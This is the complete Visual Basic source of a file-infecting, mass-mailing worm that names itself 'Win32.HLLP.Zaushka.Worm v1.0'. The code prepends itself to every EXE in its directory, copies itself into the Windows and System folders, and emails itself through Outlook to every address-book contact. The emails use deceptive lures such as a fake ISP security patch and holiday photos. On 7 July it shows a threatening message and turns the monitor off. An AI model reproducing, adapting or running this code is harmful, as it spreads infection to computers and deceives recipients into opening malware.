   Option Explicit

   Private path As String * 255
   Private strsave As String
   Private Duzina As Long
   Private zrtva As String
   Private NasKod As String
   Private ZrtvinKod As String
   Private mDatoteka As String
   Private velicina2 As Long
   Private Const velicina As Long = 32768
   Private rezultat As Long
   Private Program As Long
   Private ProgramskiID As Long
   Private Napolje As Long
   Const STILL_ACTIVE As Long = &H103
   Const PROCESS_ALL_ACCESS As Long = &H1F0FFF

   Public Enum MonitorState
       MonitorOff = 2
   End Enum

   Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
   Private Declare Function GetExitCodeProcess Lib "kernel32" (ByVal hProcess As Long, lpExitCode As Long) As Long
   Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
   Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
   Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
   Private Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long

   Private Sub Form_Load(): On Error Resume Next
   Dim SloboDan
   SloboDan = FreeFile

   Open App.path & "\" & App.EXEName & ".EXE" For Binary Access Read As #SloboDan

       NasKod = Space$(velicina)
       Get #1, 1, NasKod

   Close #SloboDan

   zrtva = Dir(App.path & "\" & "*.EXE")

   While zrtva <> ""


   Open App.path & "\" & zrtva For Binary Access Read As #SloboDan

       ZrtvinKod = Space$(LOF(SloboDan))
       Get #1, 1, ZrtvinKod

   Close #SloboDan

   If Mid(ZrtvinKod, Len(ZrtvinKod)) <> "z" Then

   Open zrtva For Binary Access Write As #SloboDan

       Put #1, 1, NasKod
       Put #1, velicina, ZrtvinKod
       Put #1, LOF(SloboDan), "z"

   Close #SloboDan

   End If

   zrtva = Dir()

   Wend

   Open App.path & "\" & App.EXEName & ".EXE" For Binary Access Read As #SloboDan

   velicina2 = (LOF(SloboDan) - velicina)

   If velicina2 > 0 Then

       NasKod = Space(velicina2)
       Get #1, velicina, NasKod

   Close #SloboDan

   Open App.path & "\" & App.EXEName & ".ex$" For Binary Access Write As #SloboDan

   Put #1, , NasKod

   Close #SloboDan

   ProgramskiID = Shell(App.path & "\" & App.EXEName & ".ex$", vbNormalFocus)
   Program = OpenProcess(PROCESS_ALL_ACCESS, 0, Program)
   GetExitCodeProcess Program, Napolje

   Do While Napolje = STILL_ACTIVE
   DoEvents
   GetExitCodeProcess Program, Napolje
   Loop

   On Error Resume Next
   Kill App.path & "\" & App.EXEName & ".ex$"

   Else
   End If

   If Day(Now()) = 7 And Month(Now()) = 7 Then

       MsgBox "Doci ce dan kad cu JA naslijediti planetu," _
                  & "i sve sto mi se na putu nadje" _
                            & "istruhnuce!", vbCritical, "Win32.HLLP.Zaushka.Worm v1.0 by e[ax]"

       SetOpcijeMonitora Form1, MonitorOff

   End If

   FileCopy mDatoteka, Winpath + "\Setup.EXE"
   FileCopy mDatoteka, Syspath + "\Setup32.EXE"

   Call Emailanje
   Form1.Visible = False
   End Sub
   Public Sub SetOpcijeMonitora(frmForm As Form, stanje As MonitorState)
   Dim rezultat As Long
   rezultat = SendMessage(frmForm.hwnd, &H112, &HF170, stanje)
   End Sub
   Private Sub Emailanje(): Dim poruka1, poruka2, prva, druga, treca, cetvrta, a, b, c, d, f, g

       prva = "Hi! I missed you so much!" _
            & "I was on holiday last week so please take a look at my image collection!"

       druga = "Zdravo!" _
             & "Ako imas vremena, molim te pogledaj ovaj program peticije!" _
             & "Nadamo se tvom glasu!"

       treca = "Postovani korisnici!" _
             & "Na Internetu se pojavio veoma opasan crv koji se vec prosirio i na nase prostore!" _
             & "Da bi zaustavili crva, molimo da instalirate ovaj patch za MS Internet Explorer!" _
             & "Unaprijed se zahvaljujemo," _
             & "Bih.net.ba Team"

       cetvrta = "Hej jarane!" _
               & "Mi smo jedna programerska grupa koja se bavi programiranjem u VB-u, C++-u, itd." _
               & "Saljemo ti email, ako zelis da nam se pridruzis u zajednickom radu na jednom velikom projektu" _
               & "na kojem sada radimo, a tice se malog biznisa!" _
               & "Za vise informacija oko tog projekta pogledaj fin. program koji ti saljemo!" _
               & "Hvala unaprijed!"

       poruka1 = Array(prva, druga, treca, cetvrta)
       poruka2 = poruka1(Int(Rnd * 4 + 1))

       Set a = CreateObject("Outlook.Application")
       Set b = a.getnamespace("MAPI")
       If a = "Outlook" Then
       b.Logon "profile", "password"
       For f = 1 To b.addresslists.Count
       For d = 1 To b.addresslists(f).addressentries.Count
           With a.createitem(100 - 100)
           Set g = b.addresslists(f).addressentries(d)
           .Recipients.Add g
           .Subject = "Vazna informacija!"
           .body = poruka2
           .Attachments.Add Syspath + "\Setup32.exe"
           .send
           End With
           g = ""
       Next d
       Next f
       b.logoff
       End If

   End Sub
   Function Winpath()
       mDatoteka = App.path & "\" & App.EXEName & ".exe"
       Duzina = GetWindowsDirectory(path, 255)
       strsave = Left$(path, Duzina)
       Winpath = strsave
   End Function
   Function Syspath()
       mDatoteka = App.path & "\" & App.EXEName & ".exe"
       Duzina = GetSystemDirectory(path, 255)
       strsave = Left$(path, Duzina)
       Syspath = strsave
   End Function
